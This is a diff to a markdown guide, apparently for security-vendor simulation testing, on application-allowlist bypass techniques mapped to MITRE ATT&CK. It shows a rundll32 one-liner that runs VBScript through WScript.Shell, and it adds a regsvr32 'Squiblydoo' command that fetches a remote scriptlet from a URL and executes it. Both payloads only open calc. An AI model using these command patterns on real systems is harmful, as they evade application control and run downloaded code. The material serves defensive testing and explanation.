@@ -89,7 +89,7 @@ https://attack.mitre.org/techniques/T1620/
 ## Allowlist Bypass (formerly Whitelist bypass)
 "Living-off-the-land" techniques that can be used to bypass Application Whitelisting Protection, usually maintain stealthiness and evasion by abusing inherent architectural weakness of the operating system.
 
-### Rundll32 RunHTMLApplication technique
+### Rundll32 RunHTMLApplication 
 
 Adversaries abuse Rundll32 to execute JavaScript and VBScript codes without downloading scripts.
 Due to architectural weakness within the rundll32 loading process, rundll32 can be misused to not only load DLLs, but also to execute a direct Javascript or VBScript code.
@@ -99,3 +99,10 @@ Due to architectural weakness within the rundll32 loading process, rundll32 can 
 https://attack.mitre.org/techniques/T1218/011/
 
 `CMD> rundll32.exe vbscript:"\..\\mshtml, RunHTMLApplication "+Close(CreateObject("WScript.Shell").Run("calc"))`
+
+### Regsvr32 "Squiblydoo" 
+ Regsvr32.exe (Microsoft signed binary) can be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web Server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique  is often referred to as "Squiblydoo" attack and has been used in campaigns targeting governments.
+
+https://attack.mitre.org/techniques/T1218/010/
+
+`PS>regsvr32.exe /u /s /i:https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/calc.txt scrobj.dll`
